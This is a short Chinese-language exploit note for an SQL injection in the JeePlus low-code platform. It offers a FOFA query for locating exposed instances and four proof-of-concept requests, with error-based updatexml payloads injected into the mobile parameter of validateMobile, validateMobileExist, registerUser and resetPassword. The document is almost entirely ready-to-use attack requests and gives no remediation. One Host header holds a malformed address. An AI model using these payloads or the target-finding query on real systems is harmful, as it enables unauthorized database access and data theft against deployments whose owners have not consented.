## JeePlus低代码开发平台存在SQL注入漏洞

## fofa
```
app="JeePlus"
```

## poc
```
GET /a/sys/user/validateMobile?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%281%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```


## poc2
```
GET /a/sys/user/validateMobileExist?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%281%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271 HTTP/1.1
Host: 0.03.614.230:8282
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
Cookie: jeeplus.session.id=a24d6e112a864ef795cce1f664a6022a;
```

## poc3
```
/a/sys/register/registerUser?roleName=wangba&mobile=13300990099'and (updatexml(1,concat(0x7e,(select user()),0x7e),1))%23&randomCode=2131&loginName=test1&password=123123&confirmNewPassword=123123&ck1=on
```

## poc4
```
/a/sys/user/resetPassword?mobile=13588888888'and (updatexml(1,concat(0x7e,(select user()),0x7e),1))%23
```
